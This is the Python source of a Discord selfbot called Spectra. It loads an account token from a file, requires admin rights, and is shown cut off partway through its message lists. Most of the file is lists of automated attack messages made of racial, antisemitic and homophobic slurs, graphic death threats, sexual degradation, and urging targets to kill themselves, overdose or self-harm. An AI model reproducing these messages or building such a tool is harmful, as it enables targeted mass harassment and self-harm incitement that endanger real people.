import os
os.system("title loader")
import time
import json
import ctypes
import colorama
from colorama import Fore
import discord
import tkinter
from tkinter import messagebox
import platform
import discord
from discord.ext import commands
from discord.ext import tasks, commands
import random
import asyncio
import subprocess
import string
import sys
import base64
import re 
import aiohttp
import datetime
import requests
from pathlib import Path
import psutil
import re
from rich.console import Console
from rich.text import Text
import colorama
import timedelta
import time
from rich.console import Console
from rich.text import Text
import json
from PIL import Image, ImageDraw, ImageFont
import aiohttp
import io
import textwrap

from winotify import Notification, audio

import ctypes
import sys
import time

def is_running_as_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

if __name__ == "__main__":
    if not is_running_as_admin():
        print("Run Spectra as an administrator.\n"
              "Right-click the exe file, click properties, click compatibility and select 'Run as administrator'.")
        print("Loader will close automatically in 20 seconds.")
        time.sleep(20)
        sys.exit(1)




def show_launch_notification():
    toast = Notification(
        app_id="Spectra",
        title="",
        msg="Welcome User, You are now using Spectra V3.1.4",
        duration="long"
    )
    toast.show()


os.system("cls" if os.name == "nt" else "clear")

print("spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra spectra")
time.sleep(0.2)

time.sleep(3)
os.system("cls" if os.name == "nt" else "clear")
os.system("title Spectra")



ascii_art = [
    ("██████╗ ██████╗ ███████╗ █████╗ ████████╗██████╗  █████╗", "#693bb3"),
    ("██╔════╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗", "#6e40ec"),
    ("╚█████╗░██████╔╝█████╗░░██║░░╚═╝░░░██║░░░██████╔╝███████║", "#6a3de5"),
    ("╚═══██╗ ██╔═══╝░██╔══╝░░██║░░██╗░░░██║░░░██╔══██╗██╔══██║", "#5936ac"),
    ("██████╔╝██║░░░░░███████╗╚█████╔╝░░░██║░░░██║░░██║██║░░██║", "#502f9c"),
    ("╚═════╝ ╚═╝     ╚══════╝░╚════╝    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝", "#502f9c"),
    ("                    Welcome, user                ", "#5221c4"),
]

from rich.console import Console
console = Console()

def print_ascii_art():
    for line, color in ascii_art:
        console.print(line, style=f"bold {color}")


downloads_path = str(Path.home() / "Downloads") 
TOKEN_PATH = f"{downloads_path}/spectra_token.json"

time.sleep(0.001)

downloads_path = str(Path.home() / "Downloads") 
TOKEN_PATH = f"{downloads_path}/spectra_token.json"

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def load_token():
    if os.path.exists(TOKEN_PATH):
        with open(TOKEN_PATH, "r") as f:
            data = json.load(f)
            return data.get("token")
    return None


thrax = [
  "YOU\nDORK\nASS\nRUNT\nDONT\nSTEP\nTO\nYOUR\nFOUNDER\n",
  "ALEX\nMURDERD\nYOU\nLMFAO\nYOUR\nSO\nWEAK\n",
  "RETARDED\nMORON\nHAIL\nALEX\nLOL\nUR\nFUCKING\nWORTHLESS\n",
  "YO\nCUCK\nDONT\nSTEP\nTO\nUR\nFATHER\nAGAIN\nILL\nHUMBLE\nYOU\nRETARD\n",
  "ILL\nSTEP\nON\nUR\nBITCH\nLMFAO\nCOME\nKILL\nME\nGET\nPAY\nBACK\nYOU\nWEAK\nFUCK\n",
  "COME\nHERE\nILL\nCHOKE\nYOU\n",
  "GET\nDROWNED\nBY\nUR\nGOD\n",
  "GET\nTHE\nFUCK\nDOWN",
  "ILL\nFUCKING\nMURDER\nYOU\nWEAK\nSKID",
  "SHOW\nYOUR\nFUNDS\nWEAK\nPOORON",
  "SHUT\nTHE\nFUCK\nUP\nRANDOM\nFEMBOY",
  "I\nTURN\nUR\nBITCH\nINTO\nMY\nSLUT",
  "YOUR\nMOM\nCUTS\nFOR\nME",
  "ILL\nNEVER\nFOLD\nOR\nDIE\nHAIL\nALEX",
  "DID\nU\nDIE\nSO\nQUICK",
  "PATHETIC\nSLOW\nBOY",
  "UR\nCLIENT\nIS\nSHIT",
  "YOUR\nFUCKING\nSTRUGGLING\nTO\nLIVE",
  "BREATHE\nMY\nWEAKEST\nCHILD",
  "ILL\nRIP\nYOUR\nINTESTINES\nOUT\nAND\nFEED\nIT\nTO\nMY\nDOG",
  "YOUR\nA\nWEAK\nSKID\nASS\nNIGGA\nLOL\nUR\nFUCKING\nRETARDED\nYOU\nBUY\nSCRIPTS\nAND\nSTILL\nDIE\nYOU\nMORON",
  "YOUR\nA\nPUSSY\nASS\nKID\nWHY\nDID\nU\nSTEP\nAND\nGOT\nPUT\nTHE\nFUCK\nDOWN",
  "STEP\nTHE\nFUCK\nDOWN\nBEFORE\nA\nREAL\nSTEPPER\nMURDERS\nYOU\nUR\nMY\nLAB\nDOG\nBARK\nFOR\nUR\nGOD\nYOU\nFEMBOY\nYOU\nHAVE\nA\nCUCK\nKINK",
  "YOUR\nEGO\nDIED\nAFTER\nI\nKILLED\nUR\nSHIT\nTOKENS\nYOUR\nADDICTED\nTO\nDYING\nBY\nALEX\nYOU\nFUCKUP\nDORK",
  "DO\nYOU\nWANT\nMY\nWORD\nLIST\n?\nLOL\nU\nMIGHT\nNEED\nIT\nU\nUSE\nCHAT\nGPT\nTO\nGIVE\nU\nWORDS",
  "SHUT\nUP\nBROKE\nASS\nKID",
  "I\nFEEL\nBAD\nBUT\nI\nHAVE\nTO\nSHOW\nYOU\nWHO\nUR\nGOD\nIS",
  "LETS\nGO\nTO\nWAR\nWATCH\nU\nDIE\nWEAK\nFUCK",
  "YOU\nWILL\nNEVER\nGET\nA\nBITCH\nAND\nIF\nU\nDO\nU\nWILL\nMAKE\nHER\nPUSSY\nDRY",
  "STFU\nYOU\n1WPM\nWARRIOR\nUR\nSAD\nAS\nSHIT",
  "ILL\nNEVER\nDIE\nKEEP\nGOING\nTILL\nYOUR\nBONES\nDECAY\nMY\nCLIENTS\nCAN\nOUTLAST\nYOUR\nWORTHLESS\nLIFE",
  "SHUT\nUP\nYOU\nLOW\nTIER\nRETARD",
  "you\ndied\nto\na\ngod\nlol\nits\nokay\njrs\nlike\nyou\nalways\nfail\nme", 
  "YOU\nDISAPOINTED\nME\nI\nWANTED\nTO\nGO\nLONGER",
  "SAY\nIT\nWITH\nYOUR\nCHEST\nYOU\nCANT\nHANDLE\nTHE\nGREATEST"
  
]



autoreplies_multi = [
    "SHUT THE FUCKUP", "UR A BITCH", "LOL", "SHUT YO LAME ASS UP NIGGA",
    "DONT FOLD", "DORK ASS CUNT", "FUCK ASS BITCH",
    "SMD HEADASS NIGGA LMFAO UR WORTH NOTHING TO ME", "UR MY BITCH",
    "FUCK ASS NIGGA", "UR MY SEED", "UR A HOE", "NIGGA U DIED TO ME",
    "IM FASTER THEN U SON", "UR A NERD", "NERD HEADASS LMFAO 🤓", "DONT STEP TO ME AGAIN",
    "NIGGA FOLDED TO ME", "PIPE THE FUCK DOWN", "I OWN U SON", "UR SLOW",
    "UR A BITCH", "LMFAO", "I DONT KNOW U", "FUCK ASS CUNT", "NIGGA TRIED STEPPING",
    "HOW DID U GET HOED LIKE THAT", "DUMB ASS BITCH", "I DONT FOLD",
    "SHUT THE FUCK UP", "TRY STEPPING AGAIN", "UR A BITCH",
    "DUMB ASS NIGGA", "DUMB ASS BITCH THOUGHT HE COULD STEP",
    "DO SUM LMFAO I RULE U", "SIGN UR LIFE AWAY TO ALEX", 
    "FOCUS UP SONNY DONT FOLD", "COME KILL ME YOU WEAK FUCK", 
    "THIS POORON CANT DO SHIT", "SHOW ME UR FUNDS", "LOLLL THIS DORK  CANT DO SHIT TO ME",
    "MY EGO BIGGER THAN YO DICK NIGGA", "LMAO ARENT U A PEDO?", "YOU STEPPED TO A GOD AND THOUGHT U WOULD MURDER ME", "WHY ARE YOU SO SLOW LMFAOOO",
     "LMFAO DONT SPEAK TO ME U EDATE SON", "LMFAO ILL TRAP U SON",
    "WHY RU FOLDING TO ME LOL", "U CANT CODE U STAND NO CHANCE AGAINST ME CRY", "LMFAO NICE DUCK KID",
    "CARVE MY NAME INTO UR SKIN ALEX OWNS ME", "LOL NICE SKID", "BOW DOWN TO ME WHORE", "I OWN U CUCK",
    "BOW DOWN TO ME", "STOP PACKING", "U LOVE SUCKING ON MY DICK", "UGLY FAN", "DONT STEP I OWN THIS",
    "IM UR GOD", "U USE GRABIFY TO DOX LMFAO", "CUT 4 ME SLUT", "UR SLOW", "U CANT DO NOTHING",
    "I OWN U WHORE", "HANG URSELF JEW", "I DONT FOLD UR MY HOE", "UR PC IS SLOW",
    "NIGGAS DUCKING LMFAO", "L FUCKING PRESS", "DORK I OWN YOU", "WHY IS THIS NIGGA CRYING LOL",
    "U CANT HARM ME", "NIGGA THINKS 764 CAN HARM LOL KILL URSELF", "STREAM UR DEATH", "ILL RAIL UR BITCH",
    "UR E GIRL CALLS ME DADDY LMFAO UR WORTHLESS", "STEP THE FUCK DOWN", "KEEP TYPING SO I CAN EXILE U",
    "BITCHLESS NIGGA HAD TO GET HIS WEAK E FRIENDS", "UR SAD AND WORTHLESS",
    "U AMOUNT TO NOTHING", "I RULE YOU", "I HOE U", "YOUR LIFE IS WORTHLESS UR PACKS ARE SLOW LOG OUT",
    "THIS NEVER STOPS", "gayest shit i seen all year", "THIS KID IS OWNED", "WHY CANT U FIGHT BACK",
    "ALEX OWNS YOU CUCK", "FUCK ASS DORK U CANT DO SHIT", "WHO THIS BITCH THINK HE IS", "WHY ARE YOU DUCKING?",
    "COME CRY TO DADDY", "NIGGAS CANT DO SHIT", "ACCEPT UR FATE", "I KILLED U", "NICE RUN",
    "KID CANT DO SHIT HES CRYING", "I OWN ALL UR E GIRLS", "IMA BEAM U", "STOP REPPING UR SHITTY CLAN",
    "SKIDS WAS MORE HARMFUL THAN THIS", "WHY ARE YOU SO UNKNOWN", "COME DO SOMETHING", "OD ON PAINKILLERS",
    "WHY ARE U SO SHITTY", "UR POOR HTML CANT DO SHIT", "COME DO SOMETHING", "I RUN THIS SHIT",
    "YOU'RE A FAILURE", "STAY SILENT, I OWN YOU", "DON'T PACK ME AGAIN", 
    "YOU'RE DONE", "KEEP TALKING JR", "MY MOM TYPES FASTER THAN THIS WHAT THE FUCK LMFAOO", 
    "YO FATASS CANT TYPE", "UR MY HOE", 
    "YOU'RE THE SLUT OF THIS SERVER", "YOU'RE PATHETIC", 
    "COME CHALLENGE ME", "YOUR WHOLE EXISTENCE IS TO SERVE ME","HOW ARE YOU USING A SKIDDED CLIENT AND STILL SLOW WTF 😂 "
]

outlast_messages = [
    "> STEP THE FUCK DOWN AND DIE TO ALEX STEP THE FUCK DOWN AND DIE TO ALEXSTEP THE FUCK DOWN AND DIE TO ALEXSTEP THE FUCK DOWN AND DIE TO ALEXSTEP THE FUCK DOWN AND DIE TO ALEXSTEP THE FUCK DOWN AND DIE TO ALEXSTEP THE FUCK DOWN AND DIE TO ALEXSTEP THE FUCK DOWN AND DIE TO ALEXSTEP THE FUCK DOWN AND DIE TO ALEXSTEP THE FUCK DOWN AND DIE TO ALEXSTEP THE FUCK DOWN AND DIE TO ALEXSTEP THE FUCK DOWN AND DIE TO ALEXSTEP THE FUCK DOWN AND DIE TO ALEXSTEP THE FUCK DOWN AND DIE TO ALEXSTEP THE FUCK DOWN AND DIE TO ALEXSTEP THE FUCK DOWN AND DIE TO ALEXSTEP THE FUCK DOWN AND DIE TO ALEXSTEP THE FUCK DOWN AND DIE TO ALEXSTEP THE FUCK DOWN AND DIE TO ALEXSTEP THE FUCK DOWN AND DIE TO ALEXSTEP THE FUCK DOWN AND DIE TO ALEXSTEP THE FUCK DOWN AND DIE TO ALEXSTEP THE FUCK DOWN AND DIE TO ALEXSTEP THE FUCK DOWN AND DIE TO ALEXSTEP THE FUCK DOWN AND DIE TO ALEXSTEP THE FUCK DOWN AND DIE TO ALEX"
    "NIGGA FOLDED TO ME", "PIPE THE FUCK DOWN", "I OWN U SON", "UR SLOW",
    "UR A BITCH", "LMFAO", "I DONT KNOW U", "FUCK ASS CUNT", "NIGGA TRIED STEPPING",
    "HOW DID U GET HOED LIKE THAT", "DUMB ASS BITCH", "I DONT FOLD",
    "SHUT THE FUCK UP", "TRY STEPPING AGAIN", "UR A BITCH",
    "DUMB ASS NIGGA", "DUMB ASS BITCH THOUGHT HE COULD STEP",
    "DO SUM LMFAO I RULE U", "SIGN UR LIFE AWAY TO ALEX", 
    "FOCUS UP SONNY DONT FOLD", "COME KILL ME YOU WEAK FUCK", 
    "THIS POORON CANT DO SHIT", "SHOW ME UR FUNDS", "LOLLL THIS DORK  CANT DO SHIT TO ME",
    "MY EGO BIGGER THAN YO DICK NIGGA", "LMAO ARENT U A PEDO?", "YOU STEPPED TO A GOD AND THOUGHT U WOULD MURDER ME", "WHY ARE YOU SO SLOW LMFAOOO",
     "LMFAO DONT SPEAK TO ME U EDATE SON", "LMFAO ILL TRAP U SON",
    "WHY RU FOLDING TO ME LOL", "U CANT CODE U STAND NO CHANCE AGAINST ME CRY", "LMFAO NICE DUCK KID",
    "CARVE MY NAME INTO UR SKIN ALEX OWNS ME", "LOL NICE SKID", "BOW DOWN TO ME WHORE", "I OWN U CUCK",
